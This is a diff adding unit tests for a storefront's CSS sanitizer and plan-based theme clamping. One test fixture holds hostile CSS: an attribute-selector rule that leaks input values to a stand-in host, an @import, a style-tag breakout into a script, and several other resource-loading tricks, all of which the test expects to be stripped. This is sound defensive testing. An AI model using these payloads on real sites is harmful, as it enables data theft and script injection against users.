@@ -118,3 +118,25 @@ describe("onboarding starters", () => {
     expect(starterTheme("unknown", "minimal", "X", "en").primaryColor).toBe(THEME_PRESETS[0].primaryColor);
   });
 });
+
+describe("plan-gated motion and custom CSS", () => {
+  it("strips everything that could load a resource or break out of <style>", async () => {
+    const { sanitizeCss } = await import("@/lib/css-sanitize");
+    const evil = String.raw`input[value^="a"]{background:url(https://evil.test/a)} @import "x.css"; </style><script>alert(1)</script> a{background:image-set("https://e.test/x" 1x)} b{behavior:url(x.htc)} c{background:u:l(x)}`;
+    const out = sanitizeCss(evil);
+    expect(out).not.toMatch(/url\(|@import|<|image-set\(|behavior:|\\/i);
+    expect(sanitizeCss(".storefront h1 { letter-spacing: -0.04em; }")).toBe(".storefront h1 { letter-spacing: -0.04em; }");
+  });
+
+  it("clamps premium motion, per-section entrances and CSS to the plan", async () => {
+    const { clampTheme } = await import("@/lib/theme-capabilities");
+    const theme = parseTheme({ motion: "cinematic", customCss: "a{color:red}", sections: [{ id: "abcd1234", type: "banner", style: { reveal: "zoom" } }] });
+    const basic = clampTheme(theme, { motion: 1, customCss: false });
+    expect(basic.motion).toBe("subtle");
+    expect(basic.customCss).toBe("");
+    expect(basic.sections[0].style.reveal).toBe("auto");
+    expect(clampTheme(theme, { motion: 0, customCss: false }).motion).toBe("none");
+    const top = clampTheme(theme, { motion: 2, customCss: true });
+    expect([top.motion, top.customCss, top.sections[0].style.reveal]).toEqual(["cinematic", "a{color:red}", "zoom"]);
+  });
+});
